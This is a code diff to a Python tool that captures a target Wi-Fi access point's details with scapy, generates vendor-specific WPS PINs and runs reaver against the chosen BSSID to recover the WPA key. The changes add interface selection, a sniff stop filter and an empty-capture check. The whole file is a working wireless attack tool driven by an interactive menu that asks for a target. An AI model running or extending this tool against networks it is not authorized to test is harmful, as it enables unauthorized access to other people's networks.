@@ -95,18 +95,27 @@ def scan_networks(adapter):
     print("[bold green]Scanning for networks... Press Ctrl+C to stop.[/bold green]")
     os.system(f"airodump-ng {adapter}")
 
-def capture_probe(bssid, vuln_db=None):
+def capture_probe(bssid, iface="wlan0mon", vuln_db=None):
     ap_info = {}
 
+    found = False
+
     def handler(pkt):
+        nonlocal found
         if pkt.haslayer(Dot11) and pkt.addr2 == bssid:
             ap_info['bssid'] = pkt.addr2
             ap_info['ssid'] = pkt.info.decode(errors='ignore')
             ap_info['vendor'] = detect_vendor(pkt.addr2)
             print(f"[bold magenta]Captured AP:[/bold magenta] {ap_info}")
+            found = True
             return True
 
-    sniff(iface="wlan0mon", prn=handler, timeout=30)
+    def stop_filter(pkt):
+        if pkt.haslayer(Dot11) and pkt.addr2 == bssid:
+            return True
+        return False
+
+    sniff(iface=iface, prn=handler, stop_filter=stop_filter, timeout=30)
     
     # Add vulnerability check if vuln_db provided
     if vuln_db:
@@ -133,11 +142,11 @@ def generate_pins(vendor):
     # Add algorithmic generation here if needed
     return pins
 
-def execute_attack(bssid, pins, timeout):
+def execute_attack(bssid, pins, timeout, iface="wlan0mon"):
     for pin in pins:
         print(f"[bold yellow]Trying PIN: {pin}[/bold yellow]")
         result = subprocess.run(
-            ["reaver", "-i", "wlan0mon", "-b", bssid, "-p", pin, "-vv"],
+            ["reaver", "-i", iface, "-b", bssid, "-p", pin, "-vv"],
             capture_output=True, text=True
         )
         if "WPA PSK" in result.stdout:
@@ -173,8 +182,12 @@ def main_menu():
             scan_networks(adapter)
         elif choice == "5":
             bssid = Prompt.ask("Enter target BSSID (MAC address)")
+            iface = Prompt.ask("Enter monitor interface name", default="wlan0mon")
             vuln_db = load_vulnerable_devices()
-            ap_info = capture_probe(bssid, vuln_db)
+            ap_info = capture_probe(bssid, iface, vuln_db)
+            if not ap_info:
+                print("[red]No AP data captured within 30s. Try again or check interface.[/red]")
+                continue
             vendor = ap_info.get("vendor", "Unknown")
             pins = generate_vendor_pins(ap_info.get("bssid", ""), vendor)
 
@@ -183,7 +196,7 @@ def main_menu():
 
             print(f"[blue]Generated pins for {vendor}:[/blue] {pins}")
             timeout = IntPrompt.ask("Enter timeout between attempts (seconds)", default=15)
-            execute_attack(bssid, pins, timeout)
+            execute_attack(bssid, pins, timeout, iface)
         elif choice == "6":
             print("[bold red]Exiting...[/bold red]")
             break
